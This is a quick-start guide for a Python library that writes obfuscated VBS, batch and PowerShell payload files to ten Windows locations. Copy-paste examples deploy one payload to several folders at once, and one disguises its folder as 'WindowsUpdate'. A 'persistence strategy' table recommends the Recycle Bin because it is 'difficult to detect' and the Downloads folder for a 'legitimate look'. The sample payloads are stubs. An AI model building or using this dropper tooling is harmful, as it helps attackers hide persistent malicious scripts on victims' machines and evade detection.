# File Writer Variants - Quick Start Guide

## Fastest Setup (Copy-Paste Ready)

### 1. Single Location Write
```python
from payload_file_writer_variants import TempFileWriter, FileFormat

writer = TempFileWriter()
path, metadata = writer.write_payload(
    'Set obj = CreateObject("WScript.Shell")',
    FileFormat.VBS,
    "high"
)
print(f"Written to: {path}")
writer.cleanup_all()
```

### 2. Multi-Location Deploy
```python
from payload_file_writer_variants import MultiLocationPayloadWriter, FileFormat

multi = MultiLocationPayloadWriter(
    variants=["temp", "appdata", "localappdata"]
)
results = multi.write_to_all_locations(
    "your payload here",
    FileFormat.VBS,
    "high"
)
summary = multi.get_summary(results)
print(f"Deployed to {summary['successful_writes']} locations")
multi.cleanup_all_locations()
```

### 3. Factory Pattern
```python
from payload_file_writer_variants import FileWriterFactory

# List variants
print(FileWriterFactory.get_available_variants())

# Create variant
writer = FileWriterFactory.create("appdata", app_name="MyApp")
path, meta = writer.write_payload("payload", FileFormat.VBS, "high")
writer.cleanup_all()
```

## All 10 Writer Variants at a Glance

| Variant | Import | Windows Path | Use Case |
|---------|--------|--------------|----------|
| TEMP | `TempFileWriter()` | `C:\Users\<user>\AppData\Local\Temp` | Quick temp files |
| APPDATA | `AppDataFileWriter("app")` | `C:\Users\<user>\AppData\Roaming` | App data storage |
| LOCALAPPDATA | `LocalAppDataFileWriter("app")` | `C:\Users\<user>\AppData\Local` | Local cache |
| ProgramData | `ProgramDataFileWriter("vendor")` | `C:\ProgramData` | System-wide (needs elevation) |
| USERPROFILE | `UserProfileFileWriter(".dir")` | `C:\Users\<user>\.dir` | Hidden user storage |
| SYSTEM | `WindowsSystemFileWriter("Temp")` | `C:\Windows\Temp` | System temp (needs elevation) |
| RECYCLEBIN | `RecycleBinFileWriter()` | `C:\$Recycle.Bin` | Hidden storage |
| PUBLIC | `PublicFileWriter("Shared")` | `C:\Users\Public\Shared` | Shared access |
| DOWNLOADS | `DownloadsFileWriter()` | `C:\Users\<user>\Downloads` | Downloads folder |
| CUSTOM | `CustomPathFileWriter("/path")` | User-specified | Any custom path |

## Supported Formats

```python
FileFormat.VBS      # VBScript
FileFormat.BAT      # Batch
FileFormat.PS1      # PowerShell
FileFormat.TEXT     # Plain text
FileFormat.JSON     # JSON
FileFormat.BINARY   # Binary
FileFormat.ENCODED  # Encoded
```

## Obfuscation Levels

```python
"low"       # Minimal obfuscation
"medium"    # Moderate obfuscation
"high"      # Maximum obfuscation
```

## Common Tasks

### Write to APPDATA with Persistence
```python
from payload_file_writer_variants import AppDataFileWriter, FileFormat

writer = AppDataFileWriter(app_name="WindowsUpdate")
path, meta = writer.write_payload(
    'Set obj = CreateObject("WScript.Shell")',
    FileFormat.VBS,
    "high"
)
# File persists in %APPDATA%\WindowsUpdate
writer.cleanup_all()
```

### Write to Recycle Bin (Hidden)
```python
from payload_file_writer_variants import RecycleBinFileWriter, FileFormat

writer = RecycleBinFileWriter()
path, meta = writer.write_payload(
    "hidden payload",
    FileFormat.VBS,
    "high"
)
# File hidden in Recycle Bin
writer.cleanup_all()
```

### Write to Multiple Locations
```python
from payload_file_writer_variants import MultiLocationPayloadWriter, FileFormat

variants = ["temp", "appdata", "localappdata", "userprofile", "downloads"]
multi = MultiLocationPayloadWriter(variants=variants)

results = multi.write_to_all_locations(
    'Set obj = CreateObject("WScript.Shell")',
    FileFormat.VBS,
    "high"
)

for variant, (path, meta) in results.items():
    print(f"{variant}: {meta.location_type} -> {path}")

multi.cleanup_all_locations()
```

### Write to Custom Path
```python
from payload_file_writer_variants import CustomPathFileWriter, FileFormat
import tempfile

custom_dir = tempfile.mkdtemp()
writer = CustomPathFileWriter(custom_dir)
path, meta = writer.write_payload("test", FileFormat.TEXT, "high")
writer.cleanup_all()
```

### Get Writer Information
```python
from payload_file_writer_variants import AppDataFileWriter

writer = AppDataFileWriter(app_name="TestApp")
print(writer.get_location_type())  # Prints: %APPDATA%\TestApp
print(writer.get_base_directory()) # Prints: /root/.appdata-sim/TestApp
```

### Use Factory to Create All Variants
```python
from payload_file_writer_variants import FileWriterFactory

writers = FileWriterFactory.create_all()
for name, writer in writers.items():
    print(f"{name}: {writer.get_location_type()}")
```

### Get Payload Metadata
```python
path, metadata = writer.write_payload(payload, FileFormat.VBS, "high")

print(f"File ID: {metadata.file_id}")
print(f"Size: {metadata.encoded_size} bytes")
print(f"Location: {metadata.location_type}")
print(f"SHA256: {metadata.sha256_hash}")
print(f"Format: {metadata.format}")
print(f"Timestamp: {metadata.timestamp}")
```

### Cleanup Specific File
```python
writer.cleanup_temp_file(metadata.file_id)
```

### Cleanup All Files
```python
count = writer.cleanup_all()
print(f"Cleaned up {count} files")
```

## Persistence Strategy Quick Reference

| Goal | Recommended Variant | Why |
|------|---------------------|-----|
| Temporary testing | TEMP | Quick, no cleanup needed |
| User persistence | APPDATA | Survives profile deletion |
| Local cache | LOCALAPPDATA | Fast, profile-specific |
| System-wide | ProgramData | All users access, needs elevation |
| Hidden user file | USERPROFILE | Hidden directories |
| Hidden system | RECYCLEBIN | Difficult to detect |
| Multi-user | PUBLIC | Accessible to all users |
| Legitimate look | DOWNLOADS | Looks like downloaded file |

## Testing Your Implementation

Run all tests:
```bash
python3 test_file_writer_variants.py
```

Run examples:
```bash
python3 file_writer_variants_examples.py
```

## Error Handling

```python
try:
    writer = FileWriterFactory.create("appdata", app_name="TestApp")
    if writer is None:
        print("Variant not found!")
    
    path, metadata = writer.write_payload(payload, FileFormat.VBS, "high")
    print(f"Success: {path}")
except Exception as e:
    print(f"Error: {e}")
finally:
    writer.cleanup_all()
```

## Key Methods Summary

| Class | Method | Purpose |
|-------|--------|---------|
| BaseFileWriter | `write_payload()` | Write payload to disk |
| BaseFileWriter | `get_payload_info()` | Get metadata for file |
| BaseFileWriter | `cleanup_temp_file()` | Delete specific file |
| BaseFileWriter | `cleanup_all()` | Delete all files |
| FileWriterFactory | `create()` | Create single variant |
| FileWriterFactory | `create_all()` | Create all variants |
| FileWriterFactory | `get_available_variants()` | List variant names |
| MultiLocationPayloadWriter | `write_to_all_locations()` | Deploy to all variants |
| MultiLocationPayloadWriter | `cleanup_all_locations()` | Clean up all locations |
| MultiLocationPayloadWriter | `get_summary()` | Get deployment stats |

## Performance Tips

1. Use TEMP for one-shot payloads (fastest)
2. Use APPDATA for persistent user storage (good balance)
3. Use LOCALAPPDATA for cached data (local only)
4. Use ProgramData only if elevation is guaranteed (system-wide)
5. Use custom paths for testing (flexible)
6. Batch operations with `MultiLocationPayloadWriter` (efficient)

## File Format Guide

- **VBS** - Windows VBScript, runs with `cscript.exe` or `wscript.exe`
- **BAT** - Batch file, runs with `cmd.exe`
- **PS1** - PowerShell script, runs with `powershell.exe`
- **TEXT** - Plain text, must be executed manually
- **JSON** - JSON data, for configuration/storage
- **BINARY** - Binary data, for encoded payloads
- **ENCODED** - Encoded payloads (base64, hex, etc.)

## Common Pitfalls

1. **Forgetting cleanup** - Always call `cleanup_all()` when done
2. **Wrong format** - Use correct `FileFormat` enum value
3. **Missing elevation** - ProgramData and Windows dirs need admin rights
4. **Path not exists** - Factory with custom app name auto-creates directories
5. **Metadata ignored** - Always capture returned metadata for tracking

## Next Steps

1. Read `/home/user/sc-generator/FILE_WRITER_VARIANTS_README.md` for full API
2. Review examples in `/home/user/sc-generator/file_writer_variants_examples.py`
3. Check tests in `/home/user/sc-generator/test_file_writer_variants.py`
4. Integrate into your project using import statements above

## Support Resources

- **Full Documentation**: FILE_WRITER_VARIANTS_README.md
- **Examples**: file_writer_variants_examples.py (10 scenarios)
- **Tests**: test_file_writer_variants.py (40+ test cases)
- **Source**: payload_file_writer_variants.py (main implementation)
